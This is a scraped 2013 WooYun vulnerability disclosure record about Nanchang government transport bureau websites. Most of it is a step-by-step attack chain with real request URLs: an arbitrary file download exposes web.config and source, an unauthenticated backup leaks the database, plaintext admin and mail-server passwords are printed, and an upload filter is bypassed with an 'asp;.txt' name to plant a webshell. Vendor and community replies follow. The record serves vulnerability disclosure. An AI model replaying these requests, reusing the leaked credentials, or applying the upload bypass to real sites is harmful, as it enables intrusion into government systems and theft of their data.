{"id": 13177, "wybug_id": "wooyun-2013-05671", "wybug_title": "南昌交通运输等局测试过程", "wybug_corp": "南昌交通运输局", "wybug_author": "possible", "wybug_date": "2013-03-14 19:46", "wybug_open_date": "2013-04-28 19:47", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件读取利用", "任意文件上传", "源码泄露", "数据库账户权限过高", "解析漏洞", "任意文件读取", "明文密码", "管理员密码泄漏", "数据库密码泄露", "反编译"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-28：\t细节向公众公开  简要描述： 南昌交通运输等局测试过程，只是想说明任意文件下载漏洞，危害还是挺大的... 详细说明：  南昌几个局（交通运输、交通运政、城乡规划,其它的没有继续寻找...)使用的江西金鼎软件建站系统，存在明显任意文件下载漏洞，从下载点获得网站源代码，找到数据库备份页面，下载数据库备份文件，本地打开bak备份文件，获得管理员等用户的明文用户名和密码，登录后台，后台上传文件过滤不完善，直接使用1.asp;.txt等绕过，获得webshell。虽然不是系统权限，但是轻则导致数据库信息泄露，任意修改界面，重则（交通运政 数据库sa权限）获得主机权限...   漏洞证明：  以下过程只是为了证明漏洞存在,并无恶意。仅给出交通运输局的测试过程:下载点:http://www.ncjt.gov.cn/DownLoad.aspx?FileName=web.config&strAbsolutePath=D:\\ncjt\\web.config获得aspx的配置文件，绝对路径直接泄露网站的根目录数据库配置信息:\t<add key=\"SQLCONNECTIONSTRING\" value=\"data source=(local);server=(local);uid=ncjt;pwd=ncjt035jk*#gfj4545;database=ncjt\"></add>在复杂的密码，在任意文件下载面前都是无用...远程连接失败...继续下载测试:http://www.ncjt.gov.cn/DownLoad.aspx?FileName=DownLoad.aspx&strAbsolutePath=D:\\ncjt\\DownLoad.aspx下载DownLoad.aspx.cshttp://www.ncjt.gov.cn/DownLoad.aspx?FileName=DownLoad.aspx.cs&strAbsolutePath=D:\\ncjt\\DownLoad.aspx.cs 失败，说明源代码被封装...由DownLoad.aspx内容<%@ Page language=\"c#\" Codebehind=\"DownLoad.aspx.cs\" AutoEventWireup=\"false\" Inherits=\"ncjt.DownLoad\" %>可以猜测出源码保存在ncjt.dll文件中下载...http://www.ncjt.gov.cn/DownLoad.aspx?FileName=ncjt.dll&strAbsolutePath=D:\\ncjt\\Bin\\ncjt.dll使用net reflector打开下载的ncjt.dll,获得源代码\n\n从上图可以看到，网站有数据库备份功能，因此直接访问http://www.ncjt.gov.cn/databackup.aspx没有认证备份数据库成功，数据库备份文件保存在'e:\\databackup.bak' 直接使用下载点下载数据库备份文件http://www.ncjt.gov.cn/DownLoad.aspx?FileName=databackup.bak&strAbsolutePath=e:\\databackup.bak本地附加数据库，获得管理密码Admin/*jtj_web#yyq/yyq wufengqin/123456 都是明文存储，直接登录后台http://www.ncjt.gov.cn/manage/manageindex.aspx\n\n在政务公告附件 功能，找到上传点:http://www.ncjt.gov.cn/manage/manage/news/AddLoadFrm.aspx?NewsNo=00002920&mpage=0&mTaskNo=001001直接上传失败，看一下源代码:\n\n上传点限制文件后缀，但是没有对文件重命名，只是在文件前面增加一个字符串，这种黑名单检测很容易绕过，上传得shell.http://www.ncjt.gov.cn/manage/manage/news/file/000001311.asp;.txthttp://www.ncjt.gov.cn/manage/test.aspx友情提醒:使用该套代码的还有如下站点(省略具体过程):http://www.ncghj.com/manage/test.aspx而且该站点有邮件服务器:http://mail.ncyg.cn/www/admin/index.phpyuwen/yuwen\n\n而且是sa权限连接数据库...还有城乡规划 局...http://www.ncghj.com/manage/test.aspx是否还有其它实例，没有继续查找，只是想借用此例说明，任意文件下载导致源码泄露危害是很大...   修复方案：  过滤   版权声明：转载请注明来源 possible@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-03-18 22:32 厂商回复： CNVD确认并复现所述情况，同时根据提示复现另一网站实例。但未能确认CMS是否为通用。已在15日下午转由CNCERT江西分中心协调涉事两个单位处置。按部分影响机密性、可用性、完整性进行评分，rank=7.48*1.2(猜解不易)*1.5＝13.464 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-14 22:24 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  Excellent.目前较为完整的一次文件包含测试过程。    \n     2013-03-19 09:25 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  关注    \n     2013-04-28 22:19 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  过程很赞!    \n     2013-04-29 08:00 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:69        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  我也南昌的    \n     2013-04-29 11:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  做的很不错啊    \n     2013-09-22 09:52 |    \t\tpiaox \t\t\t( 普通白帽子  |\t\t\t        Rank:239 漏洞数:41        )\t\t \n  @Nicky 你南昌的？ 哪里工作    \n     2013-09-22 14:04 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:69        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  @piaox 已私信联系方式    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}